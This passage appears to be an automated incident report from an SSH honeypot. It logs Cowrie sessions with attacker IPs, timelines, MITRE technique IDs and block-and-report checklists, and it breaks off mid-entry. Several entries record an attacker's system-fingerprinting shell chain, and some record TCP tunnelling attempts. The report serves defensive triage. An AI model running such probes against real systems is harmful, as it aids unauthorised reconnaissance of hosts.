| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:31:06` | `cowrie.session.connect` |
| `2026-07-13 05:31:07` | `cowrie.client.version` |
| `2026-07-13 05:31:07` | `cowrie.client.kex` |
| `2026-07-13 05:31:08` | `cowrie.login.success` |
| `2026-07-13 05:31:10` | `cowrie.session.params` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.success` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.command.input` |
| `2026-07-13 05:31:10` | `cowrie.log.closed` |
| `2026-07-13 05:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69330b5ac2f

| Field | Detail |
|---|---|
| **Source IP** | `184.105.247[.]252` |
| **First Seen** | 2026-07-13 05:32 |
| **Last Seen** | 2026-07-13 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:32:54` | `cowrie.session.connect` |
| `2026-07-13 05:32:54` | `cowrie.login.success` |
| `2026-07-13 05:32:55` | `cowrie.session.params` |
| `2026-07-13 05:32:55` | `cowrie.command.input` |
| `2026-07-13 05:32:55` | `cowrie.command.input` |
| `2026-07-13 05:32:55` | `cowrie.command.failed` |
| `2026-07-13 05:32:55` | `cowrie.command.input` |
| `2026-07-13 05:32:55` | `cowrie.command.failed` |
| `2026-07-13 05:32:55` | `cowrie.command.input` |
| `2026-07-13 05:32:55` | `cowrie.log.closed` |
| `2026-07-13 05:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.105.247[.]252` to AbuseIPDB if not already reported
- [ ] Block `184.105.247[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a653e63dffe

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:12` | `cowrie.session.connect` |
| `2026-07-13 05:33:12` | `cowrie.client.version` |
| `2026-07-13 05:33:13` | `cowrie.client.kex` |
| `2026-07-13 05:33:13` | `cowrie.login.success` |
| `2026-07-13 05:33:14` | `cowrie.session.params` |
| `2026-07-13 05:33:14` | `cowrie.command.input` |
| `2026-07-13 05:33:14` | `cowrie.log.closed` |
| `2026-07-13 05:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305389caf682

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:22` | `cowrie.session.connect` |
| `2026-07-13 05:33:22` | `cowrie.client.version` |
| `2026-07-13 05:33:22` | `cowrie.client.kex` |
| `2026-07-13 05:33:23` | `cowrie.login.success` |
| `2026-07-13 05:33:24` | `cowrie.session.params` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.success` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.command.input` |
| `2026-07-13 05:33:24` | `cowrie.log.closed` |
| `2026-07-13 05:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2a8eda2a96

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:24` | `cowrie.session.connect` |
| `2026-07-13 05:33:30` | `cowrie.login.success` |
| `2026-07-13 05:33:31` | `cowrie.session.params` |
| `2026-07-13 05:33:35` | `cowrie.log.closed` |
| `2026-07-13 05:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed163ccd6ae8

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:24` | `cowrie.session.connect` |
| `2026-07-13 05:33:31` | `cowrie.login.success` |
| `2026-07-13 05:33:32` | `cowrie.session.params` |
| `2026-07-13 05:33:35` | `cowrie.log.closed` |
| `2026-07-13 05:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca07d8219b44

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:35` | `cowrie.session.connect` |
| `2026-07-13 05:33:35` | `cowrie.login.success` |
| `2026-07-13 05:33:36` | `cowrie.session.params` |
| `2026-07-13 05:33:40` | `cowrie.log.closed` |
| `2026-07-13 05:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df6290d0c74

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:36` | `cowrie.session.connect` |
| `2026-07-13 05:33:36` | `cowrie.login.success` |
| `2026-07-13 05:33:37` | `cowrie.session.params` |
| `2026-07-13 05:33:40` | `cowrie.log.closed` |
| `2026-07-13 05:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd6a1f2432b

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:38` | `cowrie.session.connect` |
| `2026-07-13 05:33:39` | `cowrie.client.version` |
| `2026-07-13 05:33:39` | `cowrie.client.kex` |
| `2026-07-13 05:33:40` | `cowrie.login.success` |
| `2026-07-13 05:33:40` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a9584d08de

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:40` | `cowrie.session.connect` |
| `2026-07-13 05:33:40` | `cowrie.login.success` |
| `2026-07-13 05:33:41` | `cowrie.session.params` |
| `2026-07-13 05:33:45` | `cowrie.log.closed` |
| `2026-07-13 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db06f14b338

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:40` | `cowrie.session.connect` |
| `2026-07-13 05:33:41` | `cowrie.login.success` |
| `2026-07-13 05:33:42` | `cowrie.session.params` |
| `2026-07-13 05:33:45` | `cowrie.log.closed` |
| `2026-07-13 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ee489fc1a0

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:40` | `cowrie.session.connect` |
| `2026-07-13 05:33:42` | `cowrie.login.success` |
| `2026-07-13 05:33:42` | `cowrie.session.params` |
| `2026-07-13 05:33:45` | `cowrie.log.closed` |
| `2026-07-13 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c93dcac9d9f

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:45` | `cowrie.session.connect` |
| `2026-07-13 05:33:45` | `cowrie.login.success` |
| `2026-07-13 05:33:46` | `cowrie.session.params` |
| `2026-07-13 05:33:51` | `cowrie.log.closed` |
| `2026-07-13 05:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76bd6385e368

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:45` | `cowrie.session.connect` |
| `2026-07-13 05:33:46` | `cowrie.login.success` |
| `2026-07-13 05:33:47` | `cowrie.session.params` |
| `2026-07-13 05:33:50` | `cowrie.log.closed` |
| `2026-07-13 05:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a20dcf7a98b7

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:45` | `cowrie.session.connect` |
| `2026-07-13 05:33:47` | `cowrie.login.success` |
| `2026-07-13 05:33:47` | `cowrie.session.params` |
| `2026-07-13 05:33:50` | `cowrie.log.closed` |
| `2026-07-13 05:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7efbfb9a6d3

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:51` | `cowrie.session.connect` |
| `2026-07-13 05:33:51` | `cowrie.login.success` |
| `2026-07-13 05:33:51` | `cowrie.session.params` |
| `2026-07-13 05:33:56` | `cowrie.log.closed` |
| `2026-07-13 05:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a2da9e34a8

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:33 |
| **Last Seen** | 2026-07-13 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:33:51` | `cowrie.session.connect` |
| `2026-07-13 05:33:51` | `cowrie.login.success` |
| `2026-07-13 05:33:52` | `cowrie.session.params` |
| `2026-07-13 05:33:56` | `cowrie.log.closed` |
| `2026-07-13 05:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91999163158

| Field | Detail |
|---|---|
| **Source IP** | `115.46.88[.]68` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:02` | `cowrie.session.connect` |
| `2026-07-13 05:34:04` | `cowrie.client.version` |
| `2026-07-13 05:34:04` | `cowrie.client.kex` |
| `2026-07-13 05:34:07` | `cowrie.login.success` |
| `2026-07-13 05:34:08` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.46.88[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.46.88[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e97f16ab115

| Field | Detail |
|---|---|
| **Source IP** | `61.169.6[.]99` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:15` | `cowrie.session.connect` |
| `2026-07-13 05:34:16` | `cowrie.client.version` |
| `2026-07-13 05:34:16` | `cowrie.client.kex` |
| `2026-07-13 05:34:19` | `cowrie.login.success` |
| `2026-07-13 05:34:20` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.6[.]99` to AbuseIPDB if not already reported
- [ ] Block `61.169.6[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94c6993b43b

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:33` | `cowrie.session.connect` |
| `2026-07-13 05:34:33` | `cowrie.login.success` |
| `2026-07-13 05:34:34` | `cowrie.session.params` |
| `2026-07-13 05:34:38` | `cowrie.log.closed` |
| `2026-07-13 05:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7394b1c22881

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:38` | `cowrie.session.connect` |
| `2026-07-13 05:34:38` | `cowrie.login.success` |
| `2026-07-13 05:34:39` | `cowrie.session.params` |
| `2026-07-13 05:34:43` | `cowrie.log.closed` |
| `2026-07-13 05:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661439f31d88

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:39` | `cowrie.session.connect` |
| `2026-07-13 05:34:39` | `cowrie.login.success` |
| `2026-07-13 05:34:40` | `cowrie.session.params` |
| `2026-07-13 05:34:43` | `cowrie.log.closed` |
| `2026-07-13 05:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93854453a743

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:43` | `cowrie.session.connect` |
| `2026-07-13 05:34:43` | `cowrie.login.success` |
| `2026-07-13 05:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53aff59ee0ce

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:49` | `cowrie.session.connect` |
| `2026-07-13 05:34:49` | `cowrie.login.success` |
| `2026-07-13 05:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14834f264e46

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:49` | `cowrie.session.connect` |
| `2026-07-13 05:34:49` | `cowrie.login.success` |
| `2026-07-13 05:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f810950cc3

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:54` | `cowrie.session.connect` |
| `2026-07-13 05:34:54` | `cowrie.login.success` |
| `2026-07-13 05:34:54` | `cowrie.session.params` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:34:54` | `cowrie.command.failed` |
| `2026-07-13 05:34:54` | `cowrie.command.input` |
| `2026-07-13 05:35:01` | `cowrie.log.closed` |
| `2026-07-13 05:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5028e4f8be

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:59` | `cowrie.session.connect` |
| `2026-07-13 05:34:59` | `cowrie.login.success` |
| `2026-07-13 05:34:59` | `cowrie.session.params` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
